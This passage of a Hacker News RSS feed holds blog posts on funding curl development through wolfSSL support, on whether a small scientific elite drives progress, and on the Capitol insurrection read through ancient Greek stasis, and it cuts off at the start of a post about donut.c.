<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding – which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn’t figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them – proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did “on the side”. It only took 21 years from first curl release to reach that point…</p>



<p>I’m living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us – and with me here I dare to claim that there’s no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets – used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars… curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>“Isn’t it easier to list companies that are <strong>not</strong> using curl?”</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and “battle hardened”. It “just works” for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won’t risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it’s free (in all meanings of the word), functional and available. There’s a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn’t fix themselves –  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There’s clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



<p>We’ve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can’t even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven’t ported the “normal” curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don’t realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven’t explored much yet is the ability to make and offer “reserved features” to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788122</guid>
            <pubDate>Fri, 15 Jan 2021 07:49:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Newton hypothesis: Is science done by a small elite?]]>
            </title>
            <description>
<![CDATA[
Score 118 | Comments 93 (<a href="https://news.ycombinator.com/item?id=25787745">thread link</a>) | @barry-cotter
<br/>
January 14, 2021 | https://nintil.com/newton-hypothesis | <a href="https://web.archive.org/web/*/https://nintil.com/newton-hypothesis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to –if given the time and means–lead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers — the extended membership of the Planck Club — during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
<p>“But when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation’s budget for physics.”</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>
</li>
<li>
<p>Further improving CRISPR (e.g. Prime Editing)</p>
</li>
</ol>
<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>
<p>In <a href="https://d1wqtxts1xzle7.cloudfront.net/30686866/Ineq_Wikipedia.pdf?1361917900=&amp;response-content-disposition=inline%3B+filename%3DOn_the_inequality_of_contributions_to_Wi.pdf&amp;Expires=1610411522&amp;Signature=P7P2cCDnu6yNhrt1L64caVUnkBRb40qvLrCZnROjgKvsSB9IP2MavdPs86gdf6AQYNf0FPLRXnH1K-dza1dQ4mBrvhWyoAUAYMlx%7EMXivPNvU9HK%7En5l59Etl8afosE63Odc9gz5aMsWVEAZTkGfgV3peaiEbk7I%7EQfQGhLsAyvz5JXI5YBJHK8u1EWrDN9xnkgKpXavLnv0-L046CM-BJntNX2sMR6j60Lt1nnZ%7ELGYQtWsn0ixPMxhDoNzNcPRCz7y%7Ef5vUQG7KGqRt-xAG%7EOZAyM78RpSF2mp871PHkbf9w1bnojA-ibc8QlJRGtb00qDEEGLV8qi7Y0bQqimWQ__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA">wikipedia</a>, only a small fraction (10%) of the active users do most (90%) of the edits. Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincaré, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/newton-hypothesis">https://nintil.com/newton-hypothesis</a></em></p>]]>
            </description>
            <link>https://nintil.com/newton-hypothesis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787745</guid>
            <pubDate>Fri, 15 Jan 2021 06:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Insurrections, Ancient and Modern (and Also Meet the Academicats)]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25787594">thread link</a>) | @parsecs
<br/>
January 14, 2021 | https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>



<figure><img data-attachment-id="5936" data-permalink="https://acoup.blog/pxl_20210114_215722402/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610643442&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1117&quot;,&quot;shutter_speed&quot;:&quot;0.041667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210114_215722402" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver (left) and Percival (right) seen here occupying the Pedant’s <a href="https://acoup.blog/category/fireside/">Fireside Chair</a>.</figcaption></figure>



<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don’t particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife – <em>stasis</em> – in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I’m going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators – some deluded, some acting in bad faith – attempting to insist that this wasn’t serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), “In the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.”</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‘c’ is hard, so Ki-lon – or if you prefer the Greek, Ku-lon – not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon’s effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‘Four Hundred’ would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> – it’s council (Thuc. 8.69).  <strong>That’s four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way – that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos’ band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we’ll come back to it).  Peisistratos’ second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn’t mean it can’t work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‘censorship’ on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean – but true – words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‘fools’ and ‘enemies’ – fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>



<figure><img data-attachment-id="5938" data-permalink="https://acoup.blog/pxl_20210110_223238849-mp_/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610299958&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1919&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210110_223238849.mp_" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver, acting as my loyal research assistant.</figcaption></figure>



<h2>This Is Not Over</h2>



<p>Let’s come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We’ve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles – someone we might term an ‘establishment’ figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn’t the end of the matter. Peisistratos, once out of power again used his wealth and support – often foreign support, we are told – to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos’ partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>



<p>I don’t know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we’ll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we’ll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn’t</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn’t) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787594</guid>
            <pubDate>Fri, 15 Jan 2021 06:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Donut.c Without a Math Library]]>
            </title>
            <description>
<![CDATA[
Score 133 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25787545">thread link</a>) | @robin_reala
<br/>
January 14, 2021 | https://www.a1k0n.net/2021/01/13/optimizing-donut.html | <a href="https://web.archive.org/web/*/https://www.a1k0n.net/2021/01/13/optimizing-donut.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that’s always been sort of unfortunate is the heavy use of <code>sin</code> and
